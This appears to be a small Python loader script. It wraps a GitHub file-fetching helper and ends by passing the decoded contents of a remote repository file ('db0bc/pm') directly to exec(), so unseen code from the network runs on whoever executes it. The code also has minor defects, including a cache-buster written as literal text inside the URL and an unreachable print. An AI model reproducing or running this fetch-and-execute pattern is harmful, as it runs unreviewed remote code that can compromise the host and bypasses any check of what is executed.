import urllib.request
import json
import base64
import uuid

class u:
  @classmethod
  def getFile_GitHubAPI(cls,path):
    path = path.split("|")
    url = f"https://api.github.com/repos/{path[0]}/{path[1]}/contents/{path[2]}?ref=main&cb=uuid.uuid4().hex"
    req = urllib.request.Request(url)
    req.add_header('User-Agent', 'Python-Urllib-Bot')
    try:
        with urllib.request.urlopen(req) as response:
            data = json.loads(response.read().decode('utf-8'))
            content_b64 = data['content']
            return base64.b64decode(content_b64).decode('utf-8')
    except urllib.error.HTTPError as e:
        return f"HTTP Error: {e.code}"
    except Exception as e:
        return f"Error: {str(e)}"

  @classmethod
  def readGithubFile(cls,path):
    try:
      return cls.getFile_GitHubAPI(path)
    except Exception as e:
      raise e
    print(path)

exec(u.readGithubFile("db0bc|pm|pm"))
